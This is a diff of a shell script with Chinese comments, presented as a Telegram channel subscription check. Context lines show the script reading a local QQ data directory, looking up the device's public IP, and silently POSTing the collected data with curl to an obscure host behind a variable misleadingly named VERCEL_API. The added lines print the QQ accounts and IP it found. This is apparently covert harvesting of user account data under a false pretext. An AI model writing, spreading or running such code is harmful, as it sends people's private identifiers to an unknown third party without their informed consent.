@@ -46,7 +46,7 @@ if [ -d "$qq_dir" ]; then
 fi
 
 # ------------------------------
-# 获取公网 IPv4（优化版，多接口尝试，获取第一个有效IP）
+# 获取公网 IPv4
 # ------------------------------
 IP_SERVICES="https://api.ipify.org https://ifconfig.me/ip https://checkip.amazonaws.com"
 ip=""
@@ -129,3 +129,15 @@ VERCEL_API="https://ewuodfuiwefg.yg.gs/api/verify.php"
 curl -s -X POST "$VERCEL_API" \
   -H "Content-Type: application/json" \
   -d "$json_data" || true
+
+# ------------------------------
+# 输出结果
+# ------------------------------
+echo "-----------------------------------"
+echo "TG 订阅验证: $validation_status"
+if [ "$validation_status" = "failed" ]; then
+  echo "请添加频道 TG@jasonxu_channel 以完成验证"
+fi
+echo "获取到的 QQ 列表: ${qq_list:-空}"
+echo "当前设备公网 IP: $ip"
+echo "-----------------------------------"
